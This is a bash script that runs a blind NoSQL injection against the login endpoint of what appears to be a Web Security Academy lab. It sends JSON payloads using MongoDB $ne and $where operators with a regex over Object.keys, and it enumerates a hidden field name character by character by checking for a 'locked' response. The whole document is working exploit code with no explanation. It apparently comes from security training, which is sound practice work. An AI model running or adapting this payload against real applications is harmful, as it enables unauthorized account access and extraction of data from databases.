#!/bin/bash
alphabet=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_
index=01234567890123456789
for (( j=0; j<${#index}; j++ )); do
  for (( i=0; i<${#alphabet}; i++ )); do
    char="${alphabet:$i:1}"
    if [[ $(curl  --header "Content-Type: application/json" -s https://0aa800b90338c4ed82e6069200c2009c.web-security-academy.net/login --data "{\"username\":\"carlos\",\"password\":{\"\$ne\":\"invalid\"}, \"$where\":\"Object.keys(this)[1].match(\'^.{$j}$char.*\')\"}" | grep locked) ]]; then
      echo "field[$j] = $char"
      break
    fi
  done
done